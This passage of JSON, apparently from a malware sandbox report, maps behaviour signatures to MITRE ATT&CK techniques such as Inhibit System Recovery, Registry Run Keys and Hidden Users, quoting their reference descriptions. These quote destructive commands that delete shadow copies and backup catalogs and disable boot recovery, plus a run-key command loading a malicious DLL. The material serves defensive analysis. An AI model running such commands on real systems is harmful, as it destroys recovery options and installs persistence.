            "description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.\n \nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries’ goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
            "techniques": [
              {
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\nFor attacks attempting to saturate the providing network, see Network Denial of Service.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Increases the number of concurrent connection per server for Internet Explorer"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1499/",
                "id": "T1499",
                "name": "Endpoint Denial of Service"
              },
              {
                "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. This may deny access to available backups and recovery options.\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. Furthermore, adversaries may disable recovery notifications, then corrupt backups.\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\nvssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet\nWindows Management Instrumentation can be used to delete volume shadow copies - wmic shadowcopy delete\nwbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet\nbcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no\nREAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services. In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Disables Windows system restore"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1490/",
                "id": "T1490",
                "name": "Inhibit System Recovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0040/",
            "id": "TA0040",
            "name": "Impact"
          },
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Modifies existing windows services"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates or modifies windows services"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/003/",
                "id": "T1543.003",
                "name": "Windows Service"
              },
              {
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Creates an undocumented autostart registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "id": "TA0003",
            "name": "Persistence"
          },
          {
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or net view using Net.\nAdversaries may also analyze data from local host files (ex: C:\\Windows\\System32\\Drivers\\etc\\hosts or /etc/hosts) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. show cdp neighbors, show arp).  ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses ping.exe to check the status of other devices and networks"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1018/",
                "id": "T1018",
                "name": "Remote System Discovery"
              },
              {
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1057/",
                "id": "T1057",
                "name": "Process Discovery"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Monitors certain registry keys / values for changes (often done to protect autostart functionality)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1012/",
                "id": "T1012",
                "name": "Query Registry"
              },
              {
                "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses ping.exe to check the status of other devices and networks"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1016/",
                "id": "T1016",
                "name": "System Network Configuration Discovery"
              },
              {
                "description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nMany command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads ini files"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1083/",
                "id": "T1083",
                "name": "File and Directory Discovery"
              },
              {
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Reads software policies"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1082/",
                "id": "T1082",
                "name": "System Information Discovery"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "id": "TA0007",
            "name": "Discovery"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading. Masquerading may also include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the user directory"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates files inside the system directory"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1036/",
                "id": "T1036",
                "name": "Masquerading"
              },
              {
                "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include del on Windows and rm or unlink on Linux and macOS.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Deletes files inside the Windows folder"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1070/004/",
                "id": "T1070.004",
                "name": "File Deletion"
              },
              {
                "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Uses regedit.exe to modify the Windows registry"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1112/",
                "id": "T1112",
                "name": "Modify Registry"
              },
              {
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational may be modified to tamper with and potentially disable Sysmon logging. \nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. Exploitation for Privilege Escalation), which may lead to bypassing anti-tampering features.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Changes security center settings (notifications, updates, antivirus, firewall)"
                  },
                  {
                    "severity": "LOW",
                    "description": "Modifies Internet Explorer zone settings"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1562/001/",
                "id": "T1562.001",
                "name": "Disable or Modify Tools"
              },
              {
                "description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key value Hide500Users to TRUE in the /Library/Preferences/com.apple.loginwindow plist file. Every user has a userID associated with it. When the Hide500Users key value is set to TRUE, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use the dscl utility to create hidden user accounts by setting the IsHidden attribute to 1. Adversaries can also hide a user’s home folder by changing the chflags to hidden. \nAdversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nOn Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using the gsettings command (ex: sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true). Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Hides user accounts"
                  },
                  {
                    "severity": "LOW",
                    "description": "Contains functionality to hide user accounts"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/002/",
                "id": "T1564.002",
                "name": "Hidden Users"
              },
              {
                "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Changes the view of files in windows explorer (hidden files and folders)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1564/001/",
                "id": "T1564.001",
                "name": "Hidden Files and Directories"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          },
          {
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "May try to detect the Windows Explorer process (often used for injection)"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1055/",
                "id": "T1055",
                "name": "Process Injection"
              },
              {
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: .sys) to disk, the payload can be loaded and registered via Native API functions such as CreateServiceW() (or manually via functions such as ZwLoadDriver() and ZwSetValueKey()), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as PnPUtil.exe. Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution. To make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component).",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Modifies existing windows services"
                  },
                  {
                    "severity": "INFO",
                    "description": "Creates or modifies windows services"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1543/003/",
                "id": "T1543.003",
                "name": "Windows Service"
              },
              {
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Creates an undocumented autostart registry key"
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1547/001/",
                "id": "T1547.001",
                "name": "Registry Run Keys / Startup Folder"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "id": "TA0004",
            "name": "Privilege Escalation"
          }
        ]
      },
      "SecondWrite": {
        "tactics": [
          {
            "description": "The adversary is trying to manipulate, interrupt, or destroy your devices and data.\n\nThe impact tactic consists of techniques used by the adversary to execute his or her mission objectives but that do not cleanly fit into another category such as Collection. Mission objectives vary based on each adversary's goals, but examples include toll fraud, destruction of device data, or locking the user out of his or her device until a ransom is paid.",
            "techniques": [
              {
